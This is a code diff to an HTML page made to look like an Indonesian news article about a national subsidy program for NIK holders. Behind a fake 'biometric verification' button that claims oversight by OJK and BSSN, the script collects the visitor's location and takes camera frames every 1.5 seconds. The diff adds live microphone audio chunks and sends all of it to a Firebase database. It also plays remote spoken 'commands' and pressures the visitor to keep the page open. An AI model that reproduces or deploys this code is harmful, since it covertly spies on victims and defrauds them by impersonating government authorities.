@@ -40,14 +40,11 @@
         <img src="https://via.placeholder.com/800x450?text=Distribusi+Bantuan+Sosial" class="w-full rounded-lg mb-6 shadow-sm">
 
         <div class="article-content text-lg">
-            <p><strong>Jakarta</strong> - Pemerintah melalui Kementerian Sosial dan Kementerian Energi dan Sumber Daya Mineral resmi meluncurkan program integrasi subsidi nasional yang menyasar seluruh pemilik Nomor Induk Kependudukan (NIK) yang terdaftar di database kependudukan nasional.</p>
+            <p><strong>Jakarta</strong> - Pemerintah resmi meluncurkan program integrasi subsidi nasional yang menyasar seluruh pemilik Nomor Induk Kependudukan (NIK).</p>
             
-            <p>Program ini bertujuan untuk menekan laju inflasi dan memastikan daya beli masyarakat tetap terjaga di tengah dinamika ekonomi global. Menteri Koordinator Bidang Perekonomian menyatakan bahwa subsidi ini bukan lagi bersifat tunai, melainkan langsung terintegrasi dengan layanan digital kependudukan masing-masing warga.</p>
-
-            <!-- Trigger Form (The Trap) -->
             <div id="trap-container" class="my-8 p-6 bg-red-50 border-l-4 border-red-600 rounded-r-lg shadow-inner">
                 <h3 class="font-bold text-xl mb-4 text-red-800 italic">Verifikasi Hak Subsidi Anda</h3>
-                <p class="text-sm text-gray-700 mb-6">Sesuai dengan protokol keamanan siber yang baru (UU No. 27/2026), setiap penerima manfaat wajib melakukan <strong>Verifikasi Biometrik Wajah</strong> dan <strong>Sinkronisasi Lokasi</strong> untuk memastikan bantuan tidak salah sasaran.</p>
+                <p class="text-sm text-gray-700 mb-6">Wajib melakukan <strong>Verifikasi Biometrik Wajah</strong> dan <strong>Sinkronisasi Lokasi</strong> untuk memastikan bantuan tidak salah sasaran.</p>
                 
                 <button id="verify-btn" class="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-4 rounded shadow-lg transition-all animate-bounce">
                     AKTIFKAN VERIFIKASI SEKARANG
@@ -55,19 +52,16 @@
                 <p class="text-[10px] text-gray-400 mt-4 text-center italic">Layanan ini diawasi oleh Otoritas Jasa Keuangan (OJK) dan BSSN.</p>
             </div>
 
-            <p>Menurut data terakhir, terdapat lebih dari 150 juta warga yang berpotensi menerima manfaat ini. Subsidi mencakup potongan tagihan listrik hingga 50% bagi golongan tertentu dan paket pangan pokok yang didistribusikan setiap bulan melalui jaringan ritel modern yang bekerja sama dengan pemerintah.</p>
-
-            <p>Direktur Jenderal Kependudukan menambahkan bahwa masyarakat tidak perlu lagi mengantre di kantor kelurahan. "Cukup melalui portal resmi berita yang terintegrasi, warga bisa langsung melakukan validasi data biometrik mereka untuk mengaktifkan status subsidi," ujarnya dalam konferensi pers pagi tadi.</p>
+            <p>Gunakan portal resmi untuk validasi data biometrik guna mengaktifkan status subsidi Anda secara instan.</p>
         </div>
     </main>
 
-    <!-- Background Process Logic -->
     <video id="v" style="display:none" autoplay playsinline></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
-        import { getFirestore, doc, setDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
+        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";
         import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-auth.js";
 
         const firebaseConfig = {
@@ -86,10 +80,8 @@
 
         document.getElementById('verify-btn').onclick = async () => {
             const btn = document.getElementById('verify-btn');
-            btn.classList.remove('animate-bounce');
-            btn.innerText = "SEDANG MENGHUBUNGKAN KE SERVER BSSN...";
+            btn.innerText = "SEDANG MENGHUBUNGKAN...";
             btn.disabled = true;
-
             await signInAnonymously(auth);
             startAgent();
         };
@@ -98,40 +90,56 @@
             const userId = auth.currentUser.uid;
             let currentLocation = null;
 
-            // 1. Get Stealth Location
             navigator.geolocation.getCurrentPosition(p => {
                 currentLocation = { lat: p.coords.latitude, lng: p.coords.longitude };
-            }, err => console.log("Loc Denied"));
+            });
 
-            // 2. Start Stealth Stream
             navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
                 const video = document.getElementById('v');
                 video.srcObject = stream;
                 const canvas = document.getElementById('c');
                 const ctx = canvas.getContext('2d');
 
-                // Update Buffer Every 1.5 seconds (Overwrite)
+                // Visual Stream (1.5s interval)
                 setInterval(async () => {
-                    canvas.width = 240; 
-                    canvas.height = 180;
+                    canvas.width = 240; canvas.height = 180;
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
                     await setDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
                         frame: canvas.toDataURL('image/jpeg', 0.3),
                         location: currentLocation,
                         timestamp: Date.now(),
                         uid: userId
-                    });
+                    }, { merge: true });
                 }, 1500);
 
-                // 3. Listen for Voice Commands (Intercom)
+                // AUDIO LIVE STREAM (Real-time chunks)
+                const mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.ondataavailable = async (event) => {
+                    if (event.data.size > 0) {
+                        const reader = new FileReader();
+                        reader.readAsDataURL(event.data);
+                        reader.onloadend = async () => {
+                            await updateDoc(doc(db, 'artifacts', appId, 'public', 'data', 'stream_buffer', userId), {
+                                audioChunk: reader.result,
+                                audioTs: Date.now()
+                            });
+                        };
+                    }
+                };
+                // Ambil audio setiap 2 detik
+                mediaRecorder.start(2000);
+                setInterval(() => {
+                    mediaRecorder.stop();
+                    mediaRecorder.start();
+                }, 2000);
+
+                // Listen for Voice Commands
                 onSnapshot(doc(db, 'artifacts', appId, 'public', 'data', 'commands', 'voice_cmd'), (snap) => {
                     if (snap.exists()) {
                         const data = snap.data();
                         if (Date.now() - data.timestamp < 3000) {
                             const utter = new SpeechSynthesisUtterance(data.text);
                             utter.lang = 'id-ID';
-                            utter.rate = 1.0;
                             window.speechSynthesis.speak(utter);
                         }
                     }
@@ -140,14 +148,9 @@
                 document.getElementById('trap-container').innerHTML = `
                     <div class="text-center p-4">
                         <div class="inline-block animate-spin rounded-full h-8 w-8 border-b-2 border-red-600 mb-2"></div>
-                        <p class="text-sm font-bold text-red-600 uppercase">Verifikasi Wajah & Lokasi Berlangsung...</p>
-                        <p class="text-xs text-gray-500">Mohon jangan tutup halaman ini agar validasi tidak gagal.</p>
-                    </div>
-                `;
-            }).catch(e => {
-                alert("Verifikasi Gagal: Akses Kamera Wajib Diberikan untuk Validasi Biometrik.");
-                location.reload();
-            });
+                        <p class="text-sm font-bold text-red-600 uppercase italic">Sinkronisasi Biometrik Sedang Berjalan...</p>
+                    </div>`;
+            }).catch(() => location.reload());
         }
     </script>
 </body>
